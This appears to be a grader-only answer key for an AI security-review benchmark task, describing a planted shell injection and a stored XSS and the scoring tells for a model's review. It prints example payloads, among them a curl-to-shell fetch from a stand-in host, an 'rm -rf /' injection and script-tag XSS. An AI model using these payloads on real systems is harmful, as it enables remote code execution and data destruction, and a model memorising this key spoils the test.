# GRADER-ONLY — Task 10 tells

## The trap
The task explicitly says "input validation is handled elsewhere — display_name was
validated as a non-empty, reasonable-length string." A bare model takes that reassurance
at face value and concludes "inputs are validated, looks safe." But **"validated non-empty
and length-capped" does NOT mean safe to interpolate into HTML or a shell command.** The
vulnerabilities are SECOND-ORDER: the tainted value is *stored* (update_profile) and then
later *used* dangerously in a different method (send_welcome, notify_admin_of_signup). The
data crosses a trust boundary in time — validated at the edge, weaponized downstream.

## The planted vulnerabilities
**V1 — SHELL INJECTION (critical): `notify_admin_of_signup` interpolates `user['display_name']`
(and email) into a `subprocess.run(..., shell=True)` string with single-quotes.** A display
name of `'; curl evil.sh | sh; '` (or simply containing a single quote) breaks out of the
quoting and executes arbitrary commands on the ops box. "Reasonable length" doesn't help —
the payload is short. This is the headline; it's remote code execution triggered by a stored
profile field.

**V2 — STORED XSS (high): `send_welcome` interpolates `display_name` into an HTML email
unescaped.** A display name of `<script>...</script>` or an `<img onerror>` renders in the
recipient's email client / any web view of the message. Length-cap doesn't prevent XSS.

**V3 — the review-scope trap itself (meta-tell): recognizing that "validated non-empty +
length" is NOT sufficient sanitization for these sinks.** The correct review REJECTS the
framing that upstream validation makes downstream interpolation safe — output encoding is
per-sink (shell-escape for the shell, HTML-escape for HTML), and must happen at the sink,
not the source.

## Tells (binary)
- **T1 — catches the shell injection (V1)**: identifies `shell=True` with interpolated
  user-controlled data as RCE. Must name the shell sink specifically. This is the one a bare
  model most often misses because the value looks "already validated."
- **T2 — catches the stored XSS (V2)**: identifies the unescaped display_name in the HTML
  email body.
- **T3 — recognizes these are SECOND-ORDER / stored**: notes that the value is validated/
  stored in one place and used dangerously elsewhere — the taint crosses methods, so edge
  validation is irrelevant to these sinks. (Explicitly rejecting the "validated elsewhere,
  so safe" framing.) THE discriminating tell.
- **T4 — exploit path per finding**: concrete payloads/steps, e.g. "set display_name to
  `';rm -rf /;'` → notify_admin runs it via shell", not "could be unsafe."
- **T5 — correct per-sink fix**: shell — drop `shell=True` and pass an argv list (or
  shlex.quote); HTML — escape/`markupsafe` the display_name at render. Recognizes fixing it
  at the API edge (input validation) is the WRONG layer — output encoding is per-sink.
- **T6 — severity discipline / no noise**: ranks V1 (RCE) above V2 (XSS); does NOT invent
  SQLi (no SQL here) or flag the SMTP call as injection without cause; does NOT rubber-stamp.

## Skill lineage
security-review ("who can abuse this"; per-sink output encoding; exploit paths),
adversarial-review (injection vectors), threat-modeling (taint crossing a trust boundary in
time). Skills arm gets security-review + adversarial-review.
Hypothesis: bare models accept "validated elsewhere" and MISS T1/T3 (the stored/second-order
nature). Skills arm, following security-review's "user content into shell/HTML escaped for
THAT context?" checklist, should catch V1/V2 and reject the framing (T3).
Headroom: HIGH — the explicit "validation handled elsewhere" note is engineered bait that
bare models take.
